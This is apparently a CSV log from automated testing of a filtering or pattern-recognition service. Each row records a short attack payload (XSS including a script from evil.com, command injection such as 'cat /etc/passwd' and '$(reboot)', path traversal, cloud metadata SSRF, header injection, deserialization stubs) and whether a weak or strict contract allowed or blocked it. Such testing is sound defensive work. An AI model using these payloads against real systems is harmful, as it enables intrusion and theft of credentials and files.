timestamp,attack_type,description,payload,contract_type,result,http_status,response_body
2025-10-12T16:45:23.620210,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-12T16:45:23.624640,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-12T16:45:23.727737,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:23.733933,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:23.840572,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:23.846489,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:23.956175,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:23.962809,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.071818,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T16:45:24.075608,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T16:45:24.182927,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.184180,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.290174,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.291818,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.395034,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.401410,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.509285,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.515742,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.624755,Cmd Injection,Simple Pipe,| whoami,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.632081,Cmd Injection,Simple Pipe,| whoami,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.741021,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:45:24.748199,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:45:24.857680,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:45:24.863152,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:45:24.967401,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:24.971956,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.080160,Cmd Injection,Backticks,`uname -a`,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:45:25.082538,Cmd Injection,Backticks,`uname -a`,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T16:45:25.189610,Cmd Injection,Command Substitution,$(reboot),Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.196290,Cmd Injection,Command Substitution,$(reboot),Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.303885,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.310411,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.417733,Path Traversal,Parent Directory,../../etc/passwd,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-12T16:45:25.424408,Path Traversal,Parent Directory,../../etc/passwd,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-12T16:45:25.532572,Path Traversal,Root Directory,/etc/shadow,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.539428,Path Traversal,Root Directory,/etc/shadow,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.648830,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.655710,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.764912,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.772249,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.881299,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.887820,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:25.992499,Path Traversal,Null Byte,../../etc/passwd%00,Weak Contract,ALLOWED,200,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-12T16:45:25.999216,Path Traversal,Null Byte,../../etc/passwd%00,Strict Contract,ALLOWED,200,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-12T16:45:26.108217,SSRF,Localhost,http://localhost/admin,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.111163,SSRF,Localhost,http://localhost/admin,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.218296,SSRF,127.0.0.1,http://127.0.0.1:8080,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.225306,SSRF,127.0.0.1,http://127.0.0.1:8080,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.334767,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.341678,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.447244,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.453974,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.558589,SSRF,Internal IP,http://10.0.0.1/,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.568969,SSRF,Internal IP,http://10.0.0.1/,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.676505,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.682247,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.790605,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.796812,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.906098,Deserialization,Java RMI Header,JRMI,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:26.912419,Deserialization,Java RMI Header,JRMI,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:27.017581,Deserialization,Python Pickle,"cposix
system
",Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:27.024020,Deserialization,Python Pickle,"cposix
system
",Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:27.132458,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Weak Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T16:45:27.135245,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Strict Contract,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
